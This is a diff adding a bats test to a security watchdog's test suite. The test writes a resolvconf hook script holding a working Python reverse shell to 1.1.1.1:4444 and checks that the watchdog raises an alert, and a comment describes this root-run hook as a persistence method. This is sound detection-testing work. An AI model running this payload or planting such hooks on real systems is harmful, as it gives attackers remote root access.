@@ -283,3 +283,20 @@ seed_benign() {
     run_wd
     cap | grep -q 'distinctive-attacker-resolvconf-hook'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on resolvconf hook surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the DNS-update-
+    # trigger root-exec persistence surface (T1546 — resolvconf
+    # runs update.d hook scripts AS ROOT every time /etc/resolv.
+    # conf is rewritten by network events / DHCP lease changes /
+    # VPN up-down).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\npython -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${HOOKD}/libc"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
